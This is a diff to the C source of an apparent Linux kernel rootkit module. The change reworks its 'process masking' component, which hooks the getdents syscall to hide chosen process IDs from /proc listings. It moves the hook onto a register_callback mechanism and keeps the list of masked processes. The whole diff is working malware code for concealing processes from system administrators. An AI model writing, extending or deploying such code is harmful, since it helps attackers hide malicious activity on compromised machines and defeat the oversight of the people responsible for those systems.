@@ -25,6 +25,7 @@
 #include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
 #include <linux/slab.h>			/* Needed for kmalloc & kfree */
 
+#include "core.h"
 
 /*******************************************************************************/
 /*                                                                             */
@@ -57,7 +58,6 @@ struct masked_process {   /* List to keep hidden processes */
 /* Definition of global variables */
 static int show_debug_messages;
 static unsigned long proc_ino;
-asmlinkage int (*pm_original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);   //TODO: should point to original_getdents
 static struct list_head masked_processes;
 
 
@@ -65,7 +65,7 @@ static struct list_head masked_processes;
 int process_masking_init(int);
 int process_masking_exit(void);
 
-asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);
+asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int, int);
 
 int mask_process(pid_t);
 int unmask_process(pid_t);
@@ -93,6 +93,8 @@ int process_masking_init(int debug_mode_on)
 
 	INIT_LIST_HEAD(&masked_processes);
 
+	register_callback(__NR_getdents, (void *)process_masking_getdents_syscall);
+
 	DEBUG_PRINT("initialized");
 
 	return 0;
@@ -101,6 +103,8 @@ int process_masking_init(int debug_mode_on)
 
 int process_masking_exit(void)
 {
+	deregister_callback(__NR_getdents, (void *)process_masking_getdents_syscall);
+
 	delete_masked_processes();
 
 	DEBUG_PRINT("exited");
@@ -111,15 +115,11 @@ int process_masking_exit(void)
 
 /* Function that replaces the original getdents syscall. In addition to what
    getdents does, additionally it ...  */
-asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int nread)
 {
-	int nread;
 	int nread_temp;
 	int pid;
 	char *endptr;
-
-	/* Call original getdents_syscall */
-	nread = pm_original_getdents_syscall(fd, dirp, count);
 
 	if (dirp->d_ino != proc_ino)
 		return nread;
